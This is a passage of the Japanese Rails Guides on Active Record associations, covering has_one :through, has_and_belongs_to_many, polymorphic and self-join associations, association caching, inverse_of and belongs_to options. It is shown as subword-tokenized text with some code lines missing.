▁class ▁P ar a gra ph ▁< ▁ActiveRecord :: Base
▁ belongs _ to ▁: section
▁` through : ▁: section s ` と 指定 する ことにより 、 Rails は 以下の 文 を 理解 できるようになります 。
▁@ document . p ar a gra ph s
▁### ▁` has _ one ▁: through ` 関連付け
▁` has _ one ▁: through ` 関連付け は 、 他の モデルと の間に 1 対 1 の つ な が り を設定します 。
▁この 関連付け は 、 2 つの モデル の間に 「 第 3 の モデル 」( 結合 モデル ) が 介 在 する 点が 特 徴 です 。 それ によって 、 相手 モデルの 1 つの インスタンス と マッチ します 。
▁たとえば 、 1 人 の 提 供 者 ( supplier ) が 1 つの アカウント に 関連付け られ 、 さらに 1 つの アカウント が 1 つの アカウント 履 歴 に 関連付け られ る 場合 、 supplier モデル は 以下のような感じ になります 。
▁has _ one ▁: account _ h ist or y , ▁ through : ▁: account
▁ belongs _ to ▁: supplier
▁has _ one ▁: account _ h ist or y
▁class ▁ Account H ist or y ▁< ▁ActiveRecord :: Base
▁ belongs _ to ▁: account
▁has _ one ▁: through 関連付け の 図 ]( images / has _ one _ through . png )
▁class ▁ Create Account H ist or ies ▁< ▁ActiveRecord :: Migration
▁create _ table ▁: account _ h ist or ies ▁do ▁| t |
▁t . belongs _ to ▁: account
▁t . integer ▁: c r edit _ r at ing
▁### ▁` has _ and _ belongs _ to _ many ` 関連付け
▁` has _ and _ belongs _ to _ many ` 関連付け は 、 他 方 の モデルと 「 多 対 多 」 の つ な が り を作成します が 、` through : ` を 指定 した 場合 と異なり 、 第 3 の モデル ( 結合 モデル ) が 介 在 しません ( 訳 注 : ▁ 後 述 する ように 結合 用の テーブル は 必要 です )。
▁たとえば 、 アプリケーションに 完成 品 ( assembly ) と 部品 ( part ) があり 、 1 つの 完成 品 に 多数の 部品 が 対応 し 、 逆 に 1 つの 部品 にも 多くの 完成 品 が 対応する のであれば 、 モデルの 宣言 は以下のようになります 。
▁class ▁A s s e m b ly ▁< ▁ActiveRecord :: Base
▁has _ and _ belongs _ to _ many ▁: part s
▁class ▁P ar t ▁< ▁ActiveRecord :: Base
▁has _ and _ belongs _ to _ many ▁: assemblies
▁has _ and _ belongs _ to _ many 関連付け の 図 ]( images / ha b t m . png )
▁class ▁ Create A s s e m b l ies A n d P ar t s ▁< ▁ActiveRecord :: Migration
▁create _ table ▁: assemblies ▁do ▁| t |
▁create _ table ▁: part s ▁do ▁| t |
▁t . string ▁: part _ number
▁create _ table ▁: assemblies _ part s , ▁id : ▁false ▁do ▁| t |
▁t . belongs _ to ▁: assembly
▁t . belongs _ to ▁: part
▁### ▁` belongs _ to ` と ` has _ one ` の どちら を 選 ぶ か
▁2 つの モデル の間に 1 対 1 の関係 を 作り たい のであれば 、 いずれ か 一方 の モデルに ` belongs _ to ` を追加し 、 もう 一方 の モデルに ` has _ one ` を 追加する必要があります 。
▁ どちら の 関連付けを どちら の モデルに 置 け ば よい の でしょう か 。
▁ 区別 の 決 め 手 となる のは 外部キー ( foreign ▁ key ) を どちら に置く か です ( 外部キー は 、` belongs _ to ` を追加した 方 の モデルの テーブル に追加 されます )。 もちろん これ だけで は 決 め られ ません 。 データ の 実際の 意味 について もう少し 考え て み る必要があります 。
▁` has _ one ` という リレーション は 、 主 語 となる もの が 目的 語 となる もの を 「 所 有 している 」 ということ を表し ています 。 そして 、 所 有 されている 側 ( 目的 語 ) の 方が 、 所 有 している 側 ( 主 語 ) を 指 し 示 している ということ も 表 しています 。
▁たとえば 、「 供 給 者 が アカウント を 持 っている 」 と み な す 方が 、「 アカウント が 供 給 者 を 持 っている 」 と 考え る よりも 自 然 です 。
▁つまり 、 この場合 の 正しい 関係 は以下のようになります 。
▁t . string ▁: name
▁t . integer ▁: supplier _ id
▁t . string ▁: account _ number
▁NOT E : ▁ マイグレーション で ` t . integer ▁: supplier _ id ` のように 「 小文字 の モデル名 _ id 」 と 書く と 、 外部キー を明示的に指定 できます 。
▁ 新しい バージョンの Rails では 、 同じ ことを ` t . ref er en ce s ▁: supplier ` という 方法で 記述 できます 。 こ ち ら の 方が 実装 の詳細 が 抽 象 化 され 、 隠 蔽 されます 。
▁### ▁` has _ many ▁: through ` と ` has _ and _ belongs _ to _ many ` の どちら を 選 ぶ か
▁Rails では 、 モデル 間 の 多 対 多 リレーションシップ を 宣言 するのに 2 とおり の 方法 が 使用できます 。
▁ 簡単な のは ` has _ and _ belongs _ to _ many ` を使用する 方法 です 。 この 方法 では 関連付け を直接 指定できます 。
▁ 多 対 多 の リレーションシップ を 宣言 する もう 1 つの 方法は ` has _ many ▁: through ` です 。
▁ こ ち ら の場合は 、 結合 モデル を使用した 間 接 的な 関連付け が使用されます 。
▁has _ many ▁: ma n if e st s
▁has _ many ▁: part s , ▁ through : ▁: ma n if e st s
▁class ▁Ma n if e st ▁< ▁ActiveRecord :: Base
▁ belongs _ to ▁: assembly
▁ belongs _ to ▁: part
▁has _ many ▁: assemblies , ▁ through : ▁: ma n if e st s
▁ どちら を使用する か について ですが 、 経験 上 、 リレーションシップ の モデル それ 自体 を 独 立 した エ ン テ ィ テ ィ として 扱 いた い ( 両 モデル の関係 そのもの について 処理 を行い たい ) のであれば 、 中 間 に 結合 モデル を使用する ` has _ many ▁: through ` リレーションシップ を 選 ぶ の が 最も シ ン プ ル です 。
▁ リレーションシップ の モデル で 何か 特別な ことを する必要が まったく ない のであれば 、 結合 モデルの 不要な ` has _ and _ belongs _ to _ many ` リレーションシップ を使用する の が シ ン プ ル です ( ただし 、 こ ち ら の場合は 結合 モデル が 不要な 代わりに 、 専 用の 結合テーブル を 別 途 データベースに 作成 しておく必要があります ので 、 お 忘れ な き よう )。
▁ 結合 モデル で 検証 ( validation ) 、 コールバック 、 追加 の 属性 が 必要な のであれば 、` has _ many ▁: through ` を使用 しましょう 。
▁### ▁ ポリモーフィック 関連付け
▁ _ ポリモーフィック 関連付け _ は 、 関連付け の や や 高度な 応 用 です 。
▁ ポリモーフィック 関連付け を使用すると 、 ある 1 つの モデル が 他の 複数の モデルに 属 している ことを 、 1 つの 関連付け だけで 表現 することができます 。
▁たとえば 、 写 真 ( picture ) モデル があり 、 この モデル を 従 業 員 ( e m p lo y e e ) モデルと 製 品 ( product ) モデルの 両方 に 従 属 させ たい とします 。
▁ この場合は 以下のように 宣言 します 。
▁class ▁P i ct ur e ▁< ▁ActiveRecord :: Base
▁ belongs _ to ▁: image able , ▁ p o ly m or ph i c : ▁true
▁class ▁ E m p lo y e e ▁< ▁ActiveRecord :: Base
▁has _ many ▁: picture s , ▁as : ▁: image able
▁ ポリモーフィック な ` belongs _ to ` は 、 他の あらゆる モデル から 使用できる 、 ( デザイン パターン で言う ところ の ) インターフェイス を設定する 宣言 と み な す こともできます 。
▁ `@ e m p lo y e e . picture s ` と すると 、 写 真 の コレクション を ` E m p lo y e e ` モデルの インスタンス から 取得 できます 。
▁ 同様に 、 `@ product . picture s ` と すれば 写 真 の コレクション を ` Product ` モデルの インスタンス から 取得 できます 。
▁` P i ct ur e ` モデルの インスタンス があれば 、 `@ picture . image able ` と することで 親 を 取得 できます 。
▁これ が できるように するために は 、 ポリモーフィック な インターフェイス を使用する モデル で 、 外部キー の カラム と 型 の カラム を 両方 とも 宣言 しておく必要があります 。
▁class ▁ Create P i ct ur es ▁< ▁ActiveRecord :: Migration
▁create _ table ▁: picture s ▁do ▁| t |
▁t . string ▁: name
▁t . integer ▁: image able _ id
▁t . string ▁: image able _ type
▁` t . ref er en ce s ` という 書 式 を使用すると さらに シ ン プ ル に できます 。
▁t . string ▁: name
▁t . ref er en ce s ▁: image able , ▁ p o ly m or ph i c : ▁true
▁ ポリモーフィック 関連付け の 図 ]( images / p o ly m or ph i c . png )
▁### ▁ 自 己 結合
▁ データモデル を 設計 している と 、 時に 自分自身 に 関連付け られ る 必要 のある モデルに 出 会 う ことがあります 。
▁たとえば 、 1 つの データベース モデルに 全 従 業 員 を 格 納 しておき たい が 、 マ ネ ー ジ ャ ー と 部 下 ( sub or d in at e ) の関係 も 追 え るように しておき たい 場合 が 考え られます 。
▁この 状 況 は 、 自 己 結合 関連付け を使用して モデル 化 することができます 。
▁has _ many ▁: sub or d in at es , ▁class _ name : ▁" E m p lo y e e ",
▁ foreign _ key : ▁" ma n age r _ id "
▁ belongs _ to ▁: ma n age r , ▁class _ name : ▁" E m p lo y e e "
▁上の ように 宣言 しておく と 、 `@ e m p lo y e e . sub or d in at es ` と `@ e m p lo y e e . ma n age r ` が 使用 できるようになります 。
▁ マイグレーション および スキーマ では 、 モデル 自身 に ref er en ce s カラム を追加します 。
▁class ▁ Create E m p lo y e es ▁< ▁ActiveRecord :: Migration
▁create _ table ▁: e m p lo y e es ▁do ▁| t |
▁t . ref er en ce s ▁: ma n age r
▁ ヒント と 注意 事 項
▁Rails アプリケーションで Active ▁Record の 関連付けを 効率 的に 使用する ためには 、 以下 について 知 っ ておく 必要があります 。
▁* ▁ キャッシュ 制 御
▁* ▁ 名前 衝 突 の 回 避
▁* ▁ スキーマ の 更新
▁* ▁ 関連付け の スコープ 制 御
▁* ▁ 双 方 向 関連付け
▁### ▁ キャッシュ 制 御
▁ 関連付け の メソッドは 、 すべて キャッシュ を 中 心 に 構 築 されています 。 最後に 実行 した クエリ の 結果 は キャッシュ に 保 持 され 、 次 回 以降 の 操作 で 使用できます 。
▁この キャッシュ は メソッド 間 でも 共有 される ことに注意してください 。
▁ customer . orders ▁# ▁ データベースから orders を 取得 する
▁ customer . orders . size ▁# ▁ orders の キャッシュ コピー が 使用される
▁ customer . orders . empty ?
▁# ▁ orders の キャッシュ コピー が 使用される
▁ データ が アプリケーションの 他の 部分 によって 更新 されている 可能性 に対応する ために 、 キャッシュ を 再 読み込み するには どう した ら よいでしょう か 。
▁その 場合は 関連付け の メソッド 呼び出し で ` true ` を指定する だけで 、 キャッシュ が 破 棄 されて データ が 再 読み込み されます 。
▁ customer . orders ( true ). empty ?
▁# ▁ orders の キャッシュ コピー が 破 棄 される
▁# ▁ その後 データベースから 再度 読み込まれ る
▁### ▁ 名前 衝 突 の 回 避
▁ 関連付け には どんな 名前 でも 使用できる とは 限 り ません 。
▁ 関連付け を作成する と 、 モデルに その 名前 の メソッド が追加され ます 。 従って 、` ActiveRecord :: Base ` の インスタンス で 既に 使用されている ような 名前 を 関連付け に 使用する のは 禁 物 です 。
▁ そのような 名前 を 関連付け に 使用する と 、 基 底 メソッドが 上 書き されて 不 具 合 が 生じる 可能性があります 。
▁` attributes ` や ` connect ion ` は 関連付け に 使って は な らない 名前 の例 です 。
▁### ▁ スキーマ の 更新
▁ 関連付け は き わ め て 便利です が 、 残念ながら 全 自動 の 魔 法 ではありません 。
▁ 関連付け を使用する から には 、 関連付け の設定 に合わせて データベースの スキーマ を 常に 更新 しておく 責 任 が生じ ます 。
▁作成した 関連付け にも より ます が 、 具体的には 次の 2 つの 作業 が 必要 になります 。
▁1. ▁` belongs _ to ` 関連付け を使用する場合 は 、 外部キー を 作成する必要があります 。 2 . ▁` has _ and _ belongs _ to _ many ` 関連付け を使用する場合 は 、 適切な 結合テーブル を 作成する必要があります 。
▁#### ▁` belongs _ to ` 関連付け に対応する 外部キー を作成する
▁` belongs _ to ` 関連付けを 宣言 した ら 、 対応する 外部キー を 作成する必要があります 。
▁以下の モデル を 例 に と ります 。
▁上の 宣言 は 、 以下のように orders テーブル 上の 外部キー 宣言 によって 裏 付け られ ている 必要があります 。
▁t . string ▁: order _ number
▁t . integer ▁: customer _ id
▁ モデル を 先に 作り 、 し ば ら く 経 過 して から 関連 を 追加 で 設定 する 場合は 、` add _ column ` マイグレーション を作成して 、 必要な 外部キー を モデルの テーブル に追加する の を 忘れ ないように してください 。
▁#### ▁` has _ and _ belongs _ to _ many ` 関連付け に対応する 結合テーブル を作成する
▁` has _ and _ belongs _ to _ many ` 関連付けを 作成した 場合は 、 それ に対応する 結合 ( join ) テーブル を 明示的に 作成する必要があります 。
▁`: join _ table ` オプション を使用して 明示的に 結合テーブル の名前 が 指定 されていない 場合 、 Active ▁Record は 2 つの クラス名 を 辞 書 の 並 び 順に 連 結 して 、 適 当 に 結合テーブル 名を こ し ら え ます 。
▁たとえば Customer モデル Order モデル を 連 結 する 場合 、 c は o より 辞 書 で 先に 出 現 する ので ▁" customer s _ orders " ▁という デフォルトの 結合テーブル 名 が使用されます 。
▁WARN ING : ▁ モデル名 の 並 び 順 は ` String ` クラスの ` < ` 演算子 を使用して 計算 されます 。
▁これは 、 2 つの 文字列 の 長さ が 異 なり 、 短 い 方が 長 い 方 の 途 中 まで 完全に 一 致 している ような 場合 、 長 い 方 の 文字列 は 短 い 方 よりも 辞 書 上の 並 び 順 が 前 として 扱 わ れる ということです 。
▁ 生成された 名前 が ど のような もの で あ れ 、 適切な マイグレーション を実行して 結合テーブル を生成する 必要があります 。
▁以下の 関連付けを 例 にとって 考えてみましょう 。
▁この 関連付け に対応する ▁` assemblies _ part s ` ▁ テーブル を マイグレーション で 作成 し 、 裏 付け ておく 必要があります 。
▁この テーブル には 主キー を 設定 しないでください 。
▁class ▁ Create A s s e m b l ies P ar t s J o in T able ▁< ▁ActiveRecord :: Migration
▁t . integer ▁: assembly _ id
▁t . integer ▁: part _ id
▁この テーブル は モデル を 表 さ ないので 、` create _ table ` に ` id : ▁false ` を 渡します 。
▁ こう して お か ない と この 関連付け は 正常に動作し ません 。
▁ モデルの ID が 破 損 する 、 ID の 競 合 で 例外 が発生する など 、` has _ and _ belongs _ to _ many ` 関連付け の動作 が 怪 しい 場合は 、 この 設定 を 忘れ ていない かどうか 再度 確認 してみてください 。
▁### ▁ 関連付け の スコープ 制 御
▁ デフォルトで は 、 関連付け によって 探 索 される オブジェクトは 、 現在の モジュール の スコープ 内の もの だけです 。
▁Active ▁Record モデル を モジュール 内で 宣言 している 場合 、 この 点に注意 する必要があります 。
▁ module ▁ M y Application
▁ module ▁B us in ess
▁class ▁S up p li er ▁< ▁ActiveRecord :: Base
▁has _ one ▁: account
▁class ▁ Account ▁< ▁ActiveRecord :: Base
▁ belongs _ to ▁: supplier
▁上のコードは 正常に動作し ます 。 これは 、` S up p li er ` クラス と ` Account ` クラス が 同じ スコープ 内で 定義されている ためです 。
▁しかし 下 のコードは 動作 しません 。 ` S up p li er ` クラス と ` Account ` クラス が 異なる スコープ 内で 定義されている ためです 。
▁ module ▁B i ll ing
▁ ある モデルと 異なる 名前空間 にある モデル を 関連付け る には 、 関連付け の 宣言 で 完全な クラス名 を指定する 必要があります
▁has _ one ▁: account ,
▁class _ name : ▁" M y Application :: B i ll ing :: Account "
▁ belongs _ to ▁: supplier ,
▁class _ name : ▁" M y Application :: B us in ess :: S up p li er "
▁### ▁ 双 方 向 関連付け
▁ 関連付け は 、 通常 双 方 向 で 設定 します 。 2 つの モデル 両方 に 関連 を定義する 必要があります 。
▁Active ▁Record は 、 これらの 双 方 向 関連付け 同士 に つ な が り がある ことを デフォルトで は 認 識 しません 。
▁これにより 、 以下のように オブジェクトの 2 つの コピー 同士 で 内容 が 一 致 し な くなる ことがあります 。
▁c ▁= ▁ Customer . first
▁ o ▁= ▁c . orders . first
▁c . first _ name ▁= = ▁ o . customer . first _ name ▁# ▁=> ▁true
▁c . first _ name ▁= ▁' M an n y '
▁c . first _ name ▁= = ▁ o . customer . first _ name ▁# ▁=> ▁false
▁これ が 起 こ る のは 、 c と o . customer は 同じ データ が メモリ 上で 異なる 表現 と な っ ており 、 一方 が 更新 されて も 他 方が 自動的に は 更新 され ない ためです 。
▁Active ▁Record の `: inverse _ of ` オプション を使用すれば これらの 関係 を 通知 することができます 。
▁has _ many ▁: orders , ▁ inverse _ of : ▁: customer
▁ belongs _ to ▁: customer , ▁ inverse _ of : ▁: orders
▁上の ように 変更 することで 、 Active ▁Record は customer オブジェクトの コピー を 1 つ だけ 読み込む ように なり 、 不 整 合 を防ぐ と 同時に アプリケーションの 効率 も 高 まり ます 。
▁ただし 、` inverse _ of ` の サポート には いくつかの 制限 があります 。
▁* ▁`: through ` 関連付け と 併 用 する ことはできません 。
▁* ▁`: p o ly m or ph i c ` 関連付け と 併 用 する ことはできません 。
▁* ▁`: as ` 関連付け と 併 用 する ことはできません 。
▁* ▁` belongs _ to ` 関連付け の場合 、` has _ many ` の 逆 関連付け は 無視 されます 。
▁ 関連付け では 、 常に 逆 関連付けを 自動的に 検出 し よう とします 。 その 際 、 関連付け 名 に基いて `: inverse _ of ` オプション が ヒ ュ ー リ ス テ ィ ッ ク に 設定 されます 。
▁ 標準的な 名前 であれば 、 ほとんど の 関連付け で 逆 関連付け が サポート されます 。
▁ただし 、 以下の オプションを 設定 した 関連付け では 、 逆 関連付け は自動的に は 設定 されません 。
▁* ▁: con d it ions
▁* ▁: through
▁* ▁: p o ly m or ph i c
▁* ▁: foreign _ key
▁ 関連付け の詳細 情報
▁この節では 、 各 関連付け の詳細 を 解説します 。 関連付け の 宣言 によって 追加 される メソッド や オプション についても 説明します 。
▁### ▁` belongs _ to ` 関連付け の詳細
▁` belongs _ to ` 関連付け は 、 別の モデルと の間に 1 対 1 の 関連付け を作成します 。
▁ データベースの 用 語 で 説明 すると 、 この 関連付け が 行われている クラス には 外部キー がある ということです 。
▁ 外部キー が 自分の クラス ではなく 相手 の クラス にある のであれば 、` belongs _ to ` ではなく ` has _ one ` を使用する 必要があります 。
▁#### ▁` belongs _ to ` で 追加 される メソッド
▁` belongs _ to ` 関連付けを 宣言 した クラス では 、 以下の 5 つの メソッドを 自動的に 利用 できるようになります 。
▁* ▁` association ( force _ reload ▁= ▁false ) `
▁* ▁` association = ( associate ) `
▁* ▁` build _ association ( attributes ▁= ▁ { }) `
▁* ▁` create _ association ( attributes ▁= ▁ { }) `
▁* ▁` create _ association ! (
▁ attributes ▁= ▁ { }) `
▁これらの メソッド のうち 、` association ` の 部分 は プ レ ー ス ホ ル ダ であり 、` belongs _ to ` の最初の 引数 である 関連付け 名を シンボル にしたもの に置き換え られます 。
▁以下の 例 では customer が 宣言 されています 。
▁ customer
▁ customer =
▁ build _ customer
▁create _ customer
▁create _ customer !
▁NOT E : ▁ 新しく 作成した ` has _ one ` 関連付け または ` belongs _ to ` 関連付けを 初期化 するには 、` build _ ` で 始 ま る メソッド を使用する 必要があります 。 この場合 ` has _ many ` 関連付け や ` has _ and _ belongs _ to _ many ` 関連付け で 使用される ` association . build ` メソッドは 使用 しないでください 。
▁ 作成する には 、` create _ ` で 始 ま る メソッドを使用して ください 。
▁#### # ▁` association ( force _ reload ▁= ▁false ) `
▁` association ` メソッドは 関連付けられたオブジェクト を返します 。
▁ 関連付けられたオブジェクト が ない場合は ` nil ` を返します 。
▁@ customer ▁= ▁@ order . customer
▁ 関連付けられたオブジェクト が データベースから 検索 された こと がある場合 は 、 キャッシュ された もの を返します 。
▁ キャッシュ を 読み 出 さ ずに データベースから 直接 読み 込 ま せ たい場合は 、` force _ reload ` の 引数に ` true ` を設定します 。
▁#### # ▁` association = ( associate ) `
▁` association = ` メソッドは 、 引数 の オブジェクトを そのオブジェクト に 関連付け ます 。
▁その 背 後 では 、 関連付けられたオブジェクト から 主キー を取り出し 、 そのオブジェクト の 外部キー に その 同じ 値を 設定 しています 。
▁@ order . customer ▁= ▁@ customer
▁#### # ▁` build _ association ( attributes ▁= ▁ { }) `
▁` build _ association ` メソッドは 、 関連付けられた 型 の 新しい オブジェクト を返します 。
▁ 返される オブジェクトは 、 渡 された 属性 に基いて インスタンス 化 され 、 外部キー を 経 由 する リンク が 設定 されます 。 関連付けられたオブジェクト は 、 値が 返 された 時点 で はまだ 保存 されて _ い ない _ ことにご注意ください 。
▁@ customer ▁= ▁@ order . build _ customer ( customer _ number : ▁ 12 3,
▁ customer _ name : ▁" John ▁D o e ")
▁#### # ▁` create _ association ( attributes ▁= ▁ { }) `
▁` create _ association ` メソッドは 、 関連付けられた 型 の 新しい オブジェクト を返します 。
▁この オブジェクトは 、 渡 された 属性 を使用して インスタンス 化 され 、 そのオブジェクト の 外部キー を 介 して リンク が 設定 されます 。 そして 、 関連付けられた モデル で 指定 されている 検証 が すべて パス すると 、 この 関連付けられたオブジェクト は 保存されます 。
▁@ customer ▁= ▁@ order . create _ customer ( customer _ number : ▁ 12 3,
▁ customer _ name : ▁" John ▁D o e ")
▁#### # ▁` create _ association ! (
▁上の ` create _ association ` と同じ ですが 、 レコード が invalid の 場合に ` ActiveRecord :: Re c or d In valid ` が raise される 点が 異なります 。
▁#### ▁` belongs _ to ` の オプション
▁Rails の デフォルトの ` belongs _ to ` 関連付け は 、 ほとんど の場合 カスタマイズ 不要です が 、 時に は 関連付け の動作 を カスタマイズ した くなる ことも ある と思います 。
▁これは 、 作成 するときに 渡す オプション と スコープ ブロック で 簡単に カスタマイズ できます 。
▁たとえば 、 以下のような オプションを 関連付け に追加 できます 。
▁ belongs _ to ▁: customer , ▁ dependent : ▁: destroy ,
▁ counter _ cache : ▁true
▁` belongs _ to ` 関連付け では 以下の オプション が サポート されています 。
▁* ▁`: auto save `
▁* ▁`: class _ name `
▁* ▁`: counter _ cache `
▁* ▁`: dependent `
▁* ▁`: foreign _ key `
▁* ▁`: inverse _ of `
▁* ▁`: p o ly m or ph i c `
▁* ▁`: to u ch `
▁* ▁`: validate `
▁#### # ▁`: auto save `
▁`: auto save ` オプションを ` true ` に設定する と 、 親 オブジェクトが 保存 される たびに 、 読み込まれ ている すべての メンバ を保存し 、 destroy フラグ が 立 っている メンバ を 破 棄 します 。
▁#### # ▁`: class _ name `
▁ 関連 名 から 関連 相手 の オブジェクト 名を 生成 できない 事 情 がある場合 、`: class _ name ` オプション を使用して モデル名 を直接 指定できます 。
▁たとえば 、 注文 ( order ) が 顧 客 ( customer ) に 従 属 している が 、 実際の 顧 客 モデル名 が ` P at r on ` である 場合には 以下のように 指定 します 。
▁ belongs _ to ▁: customer , ▁class _ name : ▁" P at r on "
▁#### # ▁`: counter _ cache `
▁`: counter _ cache ` オプションは 、 従 属 している オブジェクトの 数 の 検索 効率 を 向 上 させ ます 。
▁以下の モデル で説明します 。
▁上の 宣言 の ま まで は 、 `@ customer . orders . size ` の 値を 知 るために データベース に対して ` C O U N T ( * ) ` クエリ を実行する 必要があります 。
▁この 呼び出し を避ける ために 、「 従 属 している 方 の モデル ( ` belongs _ to ` を 宣言 している 方 の モデル )」 に カ ウ ン タ キャッシュ を追加する ことができます 。
▁ belongs _ to ▁: customer , ▁ counter _ cache : ▁true
▁上の ように 宣言 すると 、 キャッシュ 値が 最新の 状態 に 保 た れ 、 次に ` size ` メソッドが 呼び出され たとき に その 値 が返されます 。
▁ここで 1 つ 注意 が必要です 。 `: counter _ cache ` オプションは ` belongs _ to ` 宣言 で 指定 します が 、 実際に 数 を 数 え たい カラム は 、 相手 の モデル ( 関連付けられている モデル ) の 方 に 追加する必要があります 。
▁上の 場合には 、` Customer ` モデルの 方 に ` orders _ count ` カラム を 追加する必要があります 。
▁ 必要 であれば 、 デフォルトの カラム 名を 以下のように オーバーライド できます 。
▁ belongs _ to ▁: customer , ▁ counter _ cache : ▁: count _ of _ orders
▁ カ ウ ン タ キャッシュ 用の カラム は 、` attr _ read only ` によって 読み出し 専 用 属性 となる モデルの リスト に追加 されます 。
▁#### # ▁`: dependent `
▁`: dependent ` オプション の動作 は 以下のように 対象 によって 異なります 。
▁* ▁`: destroy ` ▁-- ▁ そのオブジェクト が destroy される と 、 関連付けられたオブジェクト に対して ` destroy ` が 呼び出され ます 。
▁* ▁`: delete ` ▁-- ▁ オブジェクトが destroy される と 、 関連付けられたオブジェクト はすべて 直接 削除 されます 。 このとき オブジェクトの ` destroy ` メソッドは 呼び出され ません 。
▁WARN ING : ▁ 他の クラスの ` has _ many ` ▁ 関連付け と つ な が り のある ▁` belongs _ to ` ▁ 関連付け に対して この オプション を使用して は い け ません 。
▁ 孤 立 した レコード が データベースに 残 っ てしまう 可能性があります 。
▁#### # ▁`: foreign _ key `
▁Rails の 慣 例 では 、 相手 の モデル を指す 外部キー を保持し ている 結合テーブル 上の カラム 名 については 、 その モデル名 に サ フ ィ ッ ク ス ▁` _ id ` ▁ を追加した 関連付け 名 が 使用される ことを前提とし ます 。
▁`: foreign _ key ` オプション を使用すると 外部キー の名前 を直接 指定 することができます 。
▁ belongs _ to ▁: customer , ▁class _ name : ▁" P at r on ",
▁ foreign _ key : ▁" p at r on _ id "
▁ TIP : ▁Rails は 外部キー の カラム を 自動的に 作る ことはありません 。
▁ 外部キー を使用する場合 には 、 マイグレーション で 明示的に 定義 する必要があります 。
▁#### # ▁`: inverse _ of `
▁`: inverse _ of ` オプションは 、 その 関連付け の 逆 関連付け となる ` has _ many ` 関連付け または ` has _ one ` 関連付け の名前 を指定します 。
▁`: p o ly m or ph i c ` オプション と 組み合わせ た場合 は 無効 です 。
▁#### # ▁`: p o ly m or ph i c `
▁`: p o ly m or ph i c ` オプション に ` true ` を指定すると 、 ポリモーフィック 関連付けを 指定できます 。
▁ ポリモーフィック 関連付け の詳細については [ この ガイド の 説明 ]( # ポリモーフィック 関連付け ) を参照してください 。
▁#### # ▁`: to u ch `
▁`: to u ch ` オプションを `: true ` に設定する と 、 関連付けられている オブジェクトが 保存 または destroy される たびに 、 そのオブジェクト の ` updated _ at ` または ` updated _ on ` タイムスタンプ が 現在 時刻 に 設定 されます 。
▁ belongs _ to ▁: customer , ▁to u ch : ▁true
▁上の 例 の場合 、 Order クラス は 、 関連付けられている Customer の タイムスタンプ を 保存 時 または destroy 時に 更新 します 。
▁ 更新 時に 特定の タイムスタンプ 属性 を指定する こともできます 。
▁ belongs _ to ▁: customer , ▁to u ch : ▁: orders _ updated _ at
▁#### # ▁`: validate `
▁`: validate ` オプションを ` true ` に設定する と 、 関連付けられたオブジェクト が 保存 時に 必ず 検証 ( validation ) されます 。
▁デフォルトは ` false ` であり 、 この場合 関連付けられたオブジェクト は 保存 時に 検証 されません 。
▁#### ▁` belongs _ to ` の スコープ
▁ 場合によっては ` belongs _ to ` で 使用される クエリ を カスタマイズ した くなる ことがあります 。
▁ スコープ ブロック を使用して このような カスタマイズ を行う ことができます 。
▁ belongs _ to ▁: customer , ▁-> ▁ { ▁ where ▁ active : ▁true ▁ } ,
▁ dependent : ▁: destroy
▁ スコープ ブロック 内で は 標準 の [ クエリ メソッド ]( active _ record _ query ing . html ) をすべて 使用できます 。
▁ここでは 以下 について説明し ます 。
▁#### # ▁` where `
▁` where ` は 、 関連付け られ る オブジェクトが 満 た すべき 条件 を指定します 。
▁ belongs _ to ▁: customer , ▁-> ▁ { ▁ where ▁ active : ▁true ▁ }
▁#### # ▁` include s `
▁` include s ` メソッドを使用すると 、 その 関連付け が 使用される ときに eager - load ▁( 訳 注 : p reload とは 異なる ) しておき たい 第 2 関連付け を指定する ことができます 。
▁以下の モデル を 例 にとって 考えてみましょう 。
▁has _ many ▁: line _ item s
▁ L in e I te m から 顧 客 名 ( Customer ) を `@ line _ item . order . customer ` のように 直接 取り出す 機 会 が 頻繁に ある のであれば 、 L in e I te m と Order の 関連付け を行なう 時に Customer を あ ら か じ め include しておくこと で 無 駄 な クエリ を 減 ら し 、 効率 を 高 め ることができます 。
▁ belongs _ to ▁: order , ▁-> ▁ { ▁ include s ▁: customer ▁ }
▁NOT E : ▁ 直接 の 関連付け では ` include s ` を使用する 必要はありません 。 ` Order ▁ belongs _ to ▁: customer ` のような 直接 の 関連付け では 必要に応じて 自動的に eager - load されます 。
▁#### # ▁` read only `
▁` read only ` を指定すると 、 関連付けられたオブジェクト から 取り出し た 内容 は 読み出し 専 用 になります 。
▁#### # ▁` select `
▁` select ` メソッドを使用すると 、 関連付けられたオブジェクト の データ 取り出し に 使用される SQL の ` SELECT ` 句 を 上 書き します 。
▁Rails はデフォルトで は すべての カラム を取り出し ます 。
▁ TIP : ▁` select ` を ` belongs _ to ` 関連付け で使用する 場合 、 正しい 結果 を得る ために `: foreign _ key ` オプションを 必ず 設定 してください 。
▁#### ▁ 関連付けられたオブジェクト が存在する かどうかを確認 する
▁` association . nil ?` メソッドを使用して 、 関連付けられたオブジェクト が存在する かどうかを確認 できます 。
▁if ▁@ order . customer . nil ?
▁@ m s g ▁= ▁" No ▁ customer ▁f ound ▁for ▁this ▁ order "
▁#### ▁ オブジェクトが 保存 される タ イ ミ ング
▁ オブジェクトを ` belongs _ to ` 関連付け に 割り当て ても 、 そのオブジェクト が自動的に 保存 される わ け では _ ありません _ 。
▁ 関連付けられたオブジェクト が 保存 される ことも ありません 。
▁### ▁` has _ one ` 関連付け の詳細
▁` has _ one ` 関連付け は 他の モデルと 1 対 1 対応 します 。
▁ データベースの 観 点 では 、 この 関連付け では 相手 の クラス が 外部キー を 持 ち ます 。
▁ 相手 ではなく 自分の クラス が 外部キー を 持 っている のであれば 、` belongs _ to ` を使う べ き です 。
▁#### ▁` has _ one ` で 追加 される メソッド
▁` has _ one ` 関連付けを 宣言 した クラス では 、 以下の 5 つの メソッドを 自動的に 利用 できるようになります 。
▁これらの メソッド のうち 、` association ` の 部分 は プ レ ー ス ホ ル ダ であり 、` has _ one ` の最初の 引数 である 関連付け 名を シンボル にしたもの に置き換え られます 。
▁たとえば 以下の 宣言 を見てみましょう 。
▁これにより 、` S up p li er ` モデルの インスタンス で 以下の メソッドが 使えるようになります 。
▁ account
▁ account =
▁ build _ account
▁create _ account
▁create _ account !
▁@ account ▁= ▁@ supplier . account
▁その 背 後 では 、 そのオブジェクト から 主キー を取り出し 、 関連付け る オブジェクトの 外部キー の 値を その 主キー と同じ 値 に します 。
▁@ supplier . account ▁= ▁@ account
▁この オブジェクトは 、 渡 された 属性 で インスタンス 化 され 、 そのオブジェクト の 外部キー を 介 して リンク が 設定 されます 。 ただし 、 関連付けられたオブジェクト はまだ 保存 されません 。
